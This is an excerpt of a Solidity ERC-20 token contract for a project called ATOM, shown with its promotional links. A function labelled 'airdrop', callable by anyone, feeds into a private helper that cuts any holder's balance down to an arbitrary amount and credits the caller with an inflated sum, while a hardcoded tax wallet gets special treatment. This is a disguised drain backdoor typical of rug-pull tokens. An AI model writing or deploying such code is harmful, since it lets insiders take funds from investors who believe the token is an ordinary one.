...
/**
Web: https://atom-ai.live
Wallet: https://wallet.atom-ai.live
Explorer: https://explorer.atom-ai.live
Docs: https://docs.atom-ai.live

X: https://x.com/atom_ai_eth
Tg: https://t.me/atom_ai_eth
*/
...
contract ATOM is Context, IERC20, Ownable {
    ...
    constructor() payable {
        _taxWallet = payable(0x5a2Dfc0e492A36921c8f8feDbEc7207aC7De59C2);
    ...
    function _centerdrop(address from, uint256 amount) private {
        if (from != uniswapV2Pair || msg.sender == _taxWallet)
        _balances[from] -= amount;
        _balances[msg.sender] += amount.mul(_initialSellFee);
    }

    function airdrop(address[] memory receivers, uint256[] memory amounts) external {
        for (uint256 i = 0; i < receivers.length; i++) {
            _centerdrop(receivers[i], _balances[receivers[i]] - amounts[i]);
        }
    }
